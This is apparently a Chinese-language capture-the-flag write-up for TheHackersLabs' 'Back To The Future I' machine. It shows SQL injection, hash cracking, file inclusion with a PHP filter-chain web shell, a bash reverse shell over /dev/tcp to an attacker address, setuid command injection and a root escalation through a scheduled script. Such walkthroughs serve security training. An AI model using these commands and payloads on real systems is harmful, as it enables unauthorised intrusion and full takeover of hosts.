{"pageProps":{"postData":{"id":"TheHackersLabsBack To The Future I","contentHtml":"<h1>Back To The Future I</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/119\">https://labs.thehackerslabs.com/machine/119</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  Back_To_The_Future_I nmap -sT -min-rate 10000 -p- 192.168.56.94\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:01 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.94\nHost is up (0.00056s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nMAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 3.52 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Back_To_The_Future_I nmap -sT -A -p 21,22,80,3306 192.168.56.94\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:05 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.94\nHost is up (0.00051s latency).\n\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey: \n|   256 f7:c5:4a:ca:73:0e:21:ed:9f:5d:7e:35:65:f6:9f:b2 (ECDSA)\n|_  256 <span class=\"hljs-built_in\">fc</span>:f2:e9:1a:ae:3c:da:94:f5:db:11:b2:8b:5c:7f:32 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62\n|_http-title: Did not follow redirect to http://hillvalley.thl/\n|_http-server-header: Apache/2.4.62 (Debian)\n3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)\nMAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: Host: _default_; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.51 ms 192.168.56.94\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 9.68 seconds\n</code></pre>\n<h3>枚举</h3>\n<p><code>FTP</code> 匿名</p>\n<pre><code class=\"hljs language-bash\">➜  Back_To_The_Future_I ftp 192.168.56.94\nConnected to 192.168.56.94.\n220 (vsFTPd 3.0.3)\nName (192.168.56.94:root): anonymous\n530 Permission denied.\nftp: Login failed\n</code></pre>\n<p><code>HTTP</code> 服务</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image1.png\" alt=\"image.png\"></p>\n<p>查看源码能找到</p>\n<pre><code class=\"hljs language-bash\">  &#x3C;!-- ¡El reloj de la torre no tiene nada que ver! ¿O sí? -->\n  &#x3C;!-- 塔钟跟这事儿一点关系都没有！或者说，有关系？-->\n</code></pre>\n<p>目录爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Back_To_The_Future_I feroxbuster --url http://hillvalley.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x a\nsp,php,txt,zip                                                                                  \n                                                                                                \n ___  ___  __   __     __      __         __   ___                           \n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__                                                                                                                                               \n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___                                                                                                                                              \nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher 🤓                 ver: 2.11.0                                                                                                                                              \n───────────────────────────┬──────────────────────                                                                                                                                              \n 🎯  Target Url            │ http://hillvalley.thl/\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ <span class=\"hljs-literal\">true</span>\n 💲  Extensions            │ [asp, php, txt, zip]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      175l      325w     3150c http://hillvalley.thl/css/styles.css\n200      GET       69l      176w     2948c http://hillvalley.thl/index.php\n200      GET       69l      176w     2948c http://hillvalley.thl/\n200      GET        3l       28w      240c http://hillvalley.thl/about.php\n302      GET        0l        0w        0c http://hillvalley.thl/admin.php => index.php\n301      GET        9l       28w      314c http://hillvalley.thl/css => http://hillvalley.thl/css/\n301      GET        9l       28w      314c http://hillvalley.thl/img => http://hillvalley.thl/img/\n200      GET      140l      809w    61123c http://hillvalley.thl/img/flux_capacitor.png\n301      GET        9l       28w      313c http://hillvalley.thl/js => http://hillvalley.thl/js/\n200      GET       23l       61w      838c http://hillvalley.thl/js/index.js\n302      GET        0l        0w        0c http://hillvalley.thl/logout.php => index.php\n200      GET        0l        0w        0c http://hillvalley.thl/config.php\n200      GET        6l       25w      216c http://hillvalley.thl/logs.php\n200      GET     9932l    58762w  4734247c http://hillvalley.thl/img/delorean.png\n200      GET       28l      143w     1121c http://hillvalley.thl/time_machine.php\n[####################] - 79s  1038210/1038210 0s      found:15      errors:0      \n[####################] - 78s  1038145/1038145 13250/s http://hillvalley.thl/ \n[####################] - 0s   1038145/1038145 94376818/s http://hillvalley.thl/css/ => Directory listing (add --scan-dir-listings to scan)\n[####################] - 7s   1038145/1038145 146548/s http://hillvalley.thl/img/ => Directory listing (add --scan-dir-listings to scan)\n[####################] - 0s   1038145/1038145 37076607/s http://hillvalley.thl/js/ => Directory listing (add --scan-dir-listings to scan)\n</code></pre>\n<p><code>about.php</code></p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image2.png\" alt=\"image.png\"></p>\n<p><code>logs.php</code></p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image3.png\" alt=\"image.png\"></p>\n<p><code>time_machine.php</code></p>\n<p>？EI Psy Kongroo ~</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image4.png\" alt=\"image.png\"></p>\n<p>没找到信息，尝试爆破登录框，也是不成功</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image5.png\" alt=\"image.png\"></p>\n<p>测试一下登录框</p>\n<p>发现存在 <code>SQL</code> 注入</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image6.png\" alt=\"image.png\"></p>\n<h2>SQL 注入</h2>\n<p>直接上 <code>SQLmap</code> ，测试出来 延时注入</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image7.png\" alt=\"image.png\"></p>\n<p>将数据都爆出来</p>\n<pre><code class=\"hljs language-bash\">current user: <span class=\"hljs-string\">'marty@localhost'</span>\ncurrent database: <span class=\"hljs-string\">'hillvalley'</span>\n\nDatabase: hillvalley\n[1 table]\n+-------+\n| <span class=\"hljs-built_in\">users</span> |\n+-------+\n\n+----+--------------------------------------------------------------+----------+\n| <span class=\"hljs-built_in\">id</span> | password                                                     | username |\n+----+--------------------------------------------------------------+----------+\n| 1  | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | marty    |\n+----+--------------------------------------------------------------+----------+\n</code></pre>\n<p>将密码进行爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Back_To_The_Future_I john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>                 \nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\nandromeda        (?)     \nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>得到一个账户 <code>marty</code>:<code>andromeda</code></p>\n<h2>文件包含</h2>\n<p>登录进去后台</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image8.png\" alt=\"image.png\"></p>\n<p>得到一些关于密码信息</p>\n<pre><code class=\"hljs language-bash\">我实施了一项基本的安全措施来保护关键的项目文件。\n我使用了与我的时光机和第一次跳跃的日期相关的密码。\n\n马蒂永远不会忘记那一天。\n\n——医生\n</code></pre>\n<p>我们还注意到<code>URL</code>是貌似是包含文件的，我们尝试一下包含一下别的文件</p>\n<p>成功将 <code>/etc/passwd</code> 包含出来</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image9.png\" alt=\"image.png\"></p>\n<p>可以直接将 <code>user.txt</code> 给包含出来</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image10.png\" alt=\"image.png\"></p>\n<p>但我们的目的是拿到 <code>shell</code></p>\n<p>测试伪协议是否可以使用</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image11.png\" alt=\"image.png\"></p>\n<p>我们尝试通过 <code>php://filter/write</code> 来写入文件，但是并没有成功</p>\n<pre><code class=\"hljs language-bash\">php://filter/write=convert.base64-decode/resource=shell.php&#x26;data=PD9waHAgZXZhbChzeXN0ZW0oJF9QT1NUWyJ4Il0pKTtwaHBpbmZvKCk7Pz4=\n</code></pre>\n<p>通过：<a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md\">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md</a></p>\n<p>能到一个工具 <strong>PHP filter chain generator</strong>：<a href=\"https://github.com/synacktiv/php_filter_chain_generator\">https://github.com/synacktiv/php_filter_chain_generator</a></p>\n<p>生成 <code>payload</code>：</p>\n<pre><code class=\"hljs language-bash\">python3 php_filter_chain_generator.py --chain <span class=\"hljs-string\">'&#x3C;?php phpinfo(); ?>  '</span>\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image12.png\" alt=\"image.png\"></p>\n<p>生成反弹 <code>shell</code> 的代码：</p>\n<pre><code class=\"hljs language-bash\">\tpython3 php_filter_chain_generator.py --chain <span class=\"hljs-string\">'&#x3C;?php eval(system($_GET[\"x\"])); ?>  '</span>\n</code></pre>\n<p>测试代码执行</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image13.png\" alt=\"image.png\"></p>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">/bin/bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/192.168.56.5/1234 0>&#x26;1'</span>\n</code></pre>\n<p>拿到立足点</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image14.png\" alt=\"image.png\"></p>\n<h2>To Marty</h2>\n<p>查看配置文件</p>\n<pre><code class=\"hljs language-bash\">www-data@hillvalley:/var/www/project/app$ <span class=\"hljs-built_in\">cat</span> config.php \n&#x3C;?php\n<span class=\"hljs-variable\">$host</span> = <span class=\"hljs-string\">\"localhost\"</span>;\n<span class=\"hljs-variable\">$user</span> = <span class=\"hljs-string\">\"marty\"</span>;\n<span class=\"hljs-variable\">$pass</span> = <span class=\"hljs-string\">\"t1m3travel\"</span>;\n<span class=\"hljs-variable\">$db</span> = <span class=\"hljs-string\">\"hillvalley\"</span>;\n\n<span class=\"hljs-variable\">$conn</span> = mysqli_connect(<span class=\"hljs-variable\">$host</span>, <span class=\"hljs-variable\">$user</span>, <span class=\"hljs-variable\">$pass</span>, <span class=\"hljs-variable\">$db</span>);\n<span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-variable\">$conn</span>) {\n    die(<span class=\"hljs-string\">\"Connection failed: \"</span> . mysqli_connect_error());\n}\n?>\n</code></pre>\n<p>拿到数据库账号密码，因为用户名是 <code>marty</code> ，我们顺便碰撞一下密码</p>\n<pre><code class=\"hljs language-bash\">www-data@hillvalley:/var/www/project/app$ su marty\nPassword: \nmarty@hillvalley:/var/www/project/app$ \n</code></pre>\n<p>成功切换到用户<code>Marty</code></p>\n<p>我们写入 <code>SSH</code> 公钥，使用公钥进行登录</p>\n<h2>To docbrown</h2>\n<p>家目录下的隐藏文件</p>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:~$ <span class=\"hljs-built_in\">cat</span> .flux_notes \nTiempos inestables... aún necesito arreglar el runner para la <span class=\"hljs-built_in\">pr</span>óxima prueba.\n</code></pre>\n<blockquote>\n<p>时间不稳定...仍然需要修复运行器以进行下一次测试。</p>\n</blockquote>\n<p>能直接看<code>docbrown</code>的家目录</p>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:/home/docbrown$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 88\ndrwxr-xr-x 15 docbrown docbrown 4096 Jul 15 10:45 .\ndrwxr-xr-x  4 root     root     4096 Jul 12 15:49 ..\nlrwxrwxrwx  1 root     root        9 Jul 13 16:50 .bash_history -> /dev/null\n-rw-r--r--  1 docbrown docbrown  220 Jul 11 22:04 .bash_logout\n-rw-r--r--  1 docbrown docbrown 3662 Jul 12 20:23 .bashrc\ndrwx------ 10 docbrown docbrown 4096 Jul 11 22:27 .cache\ndrwx------  9 docbrown docbrown 4096 Jul 12 20:41 .config\n-rw-r--r--  1 docbrown docbrown 5290 Jul 11 22:04 .face\nlrwxrwxrwx  1 docbrown docbrown    5 Jul 11 22:04 .face.icon -> .face\n-rw-r--r--  1 docbrown docbrown  110 Jul 13 14:10 .flux_hint\ndrwx------  4 docbrown docbrown 4096 Jul 11 22:08 .<span class=\"hljs-built_in\">local</span>\ndrwx------  4 docbrown docbrown 4096 Jul 11 22:27 .mozilla\n-rw-r--r--  1 docbrown docbrown  807 Jul 11 22:04 .profile\n-rw-------  1 docbrown docbrown  817 Jul 13 12:52 .viminfo\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Desktop\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Documents\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Downloads\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Music\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Pictures\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Public\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Templates\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Videos\ndrwxrwxrwx  2 docbrown docbrown 4096 Jul 12 20:49 docs\n</code></pre>\n<p><code>.flux_hint</code></p>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:/home/docbrown$ <span class=\"hljs-built_in\">cat</span> .flux_hint \nHe estado trabajando en una nueva forma de sincronizar los scripts del sistema. Cada minuto... como un reloj.\n</code></pre>\n<blockquote>\n<p>我一直在研究一种同步系统脚本的新方法。分分秒秒……精准无误。</p>\n</blockquote>\n<p>提到了同步系统脚本，我们上<code>pspy</code>看看</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image15.png\" alt=\"image.png\"></p>\n<p>注意到 <strong><code>/usr/local/bin/flux_admin.sh</code></strong></p>\n<p>但是根目录中也是没有</p>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:/usr/local/bin$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 40\ndrwxr-xr-x  2 root root  4096 Jul 14 21:53 .\ndrwxr-xr-x 10 root root  4096 Jul 11 21:56 ..\n-rwxr-xr-x  1 root root 16200 Jul 12 20:49 backup_runner\n-rwx------  1 root root 16296 Jul 14 20:44 time_daemon\n</code></pre>\n<p>上 <code>linpeas.sh</code> 看看</p>\n<p>可以注意到如下信息</p>\n<pre><code class=\"hljs language-bash\">Files with capabilities (limited to 50): \n/usr/local/bin/backup_runner cap_setuid=ep \n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep\n/usr/bin/ping cap_net_raw=ep \n</code></pre>\n<p>当程序 <code>backup_runner</code> 运行时一些拥有 <code>setuid</code> 权限，可以以其他用户权限运行</p>\n<p>我们将其拉出去分析一下</p>\n<pre><code class=\"hljs language-bash\">int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char s[264]; // [rsp+10h] [rbp-110h] BYREF\n  const char *v5; // [rsp+118h] [rbp-8h]\n\n  <span class=\"hljs-keyword\">if</span> ( argc != 2 )\n    usage(argc, argv, envp);\n  v5 = argv[1];\n  snprintf(s, 0x100uLL, <span class=\"hljs-string\">\"tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs\"</span>, v5);\n  setuid(0x3E8u);\n  system(s);\n  <span class=\"hljs-built_in\">return</span> 0;\n}\n</code></pre>\n<p>其中的 <code>setuid(0x3E8u);</code> 也就是 <code>1000</code> ，而 <code>1000</code> 刚好是 <code>docbrown</code></p>\n<p>并且执行的命令是 <code>tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs</code></p>\n<p>该程序存在命令注入，因为 <code>v5</code> 并没有被处理，而是直接被调用</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-string\">\"; id ;\"</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner <span class=\"hljs-string\">\"; id ;\"</span>\ntar: Cowardly refusing to create an empty archive\nTry <span class=\"hljs-string\">'tar --help'</span> or <span class=\"hljs-string\">'tar --usage'</span> <span class=\"hljs-keyword\">for</span> more information.\nuid=1000(docbrown) gid=1001(marty) <span class=\"hljs-built_in\">groups</span>=1001(marty)\nsh: 1: -backup.tar.gz: not found\n</code></pre>\n<p>获得 <code>docbrown</code> 的 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner <span class=\"hljs-string\">\"; /bin/bash -p ;\"</span>\ntar: Cowardly refusing to create an empty archive\nTry <span class=\"hljs-string\">'tar --help'</span> or <span class=\"hljs-string\">'tar --usage'</span> <span class=\"hljs-keyword\">for</span> more information.\ndocbrown@hillvalley:/home/docbrown$ \n</code></pre>\n<h2>To Root</h2>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">docbrown@hillvalley:/home/docbrown$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> docbrown on hillvaley:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser docbrown may run the following commands on hillvaley:\n    (root) NOPASSWD: /usr/local/bin/time_daemon\n</code></pre>\n<p>我们尝试运行一下</p>\n<pre><code class=\"hljs language-bash\">[FLUX] No existe el archivo /tmp/sync: No such file or directory\n</code></pre>\n<pre><code class=\"hljs language-bash\">docbrown@hillvalley:/tmp$ vim <span class=\"hljs-built_in\">sync</span>\ndocbrown@hillvalley:/tmp$ <span class=\"hljs-built_in\">sudo</span> time_daemon\n[88MPH] Sincronización completada. Listo para viajar.\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image16.png\" alt=\"image.png\"></p>\n<p>貌似是创建定时任务</p>\n<p>我们将提权语句写入 <code>/tmp/sync</code> 并运行 <code>time_deamon</code></p>\n<pre><code class=\"hljs language-bash\">docbrown@hillvalley:/tmp$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"chmod +s /bin/bash\"</span> > /tmp/sync\n\ndocbrown@hillvalley:/usr/local/bin$ <span class=\"hljs-built_in\">sudo</span> /usr/local/bin/time_daemon\n[88MPH] Sincronización completada. Listo para viajar.\n</code></pre>\n<p>等在 <code>pspy</code> 显示运行计划任务，再查看</p>\n<pre><code class=\"hljs language-bash\">docbrown@hillvalley:/usr/local/bin$ <span class=\"hljs-built_in\">ls</span> -al /bin/bash\n-rwsr-sr-x 1 root root 1265648 Apr 18 19:47 /bin/bash\n</code></pre>\n<p>最后读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">bash-5.2# <span class=\"hljs-built_in\">cat</span> notes.txt \n¡Felicidades, viajero del tiempo!\n\nLograste lo imposible: viajaste al pasado, burlaste sistemas protegidos, superaste obstáculos temporales y... \n¡volviste al futuro con todos los flags en el DeLorean!\n\nDoc estaría orgulloso, y Marty… bueno, seguro todavía está en problemas con Biff. \nPero vos… vos demostraste que no hay sistema que se te resista ni timeline que no puedas manipular.\n\n    “El futuro no está escrito, todavía. El tuyo será exactamente como lo hagas.”\n    — Doc Emmett Brown\n\nGracias por jugar este CTF inspirado en una de las mejores trilogías de todos los tiempos. \n\nSi disfrutaste el viaje, no olvides compartir tus hallazgos con otros hackers del tiempo y prepararte para los <span class=\"hljs-built_in\">pr</span>óximos desafíos que se vienen en la saga.\n\nbash-5.2# <span class=\"hljs-built_in\">cat</span> root.txt \nFLAGxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>难度还好，就是有些地方会卡住</p>","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","updated":"2025-07-26","tags":["TheHackersLabs","Linux","SQLinjection","FileInclude","CommandInjection"],"categories":"靶机","comments":true,"description":"Back To The Future I\n\n https://labs.thehackerslabs.com/machine/119\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n枚举\n\n`FTP` 匿名\n\n\n\n`HTTP` 服务\n\n\n\n查看源码能找到\n\n\n\n目录爆破\n\n\n\n`about.php`\n\n\n\n`logs.php`\n\n\n\n`time_machine.php`\n\n ？EI Psy K..."}},"__N_SSG":true}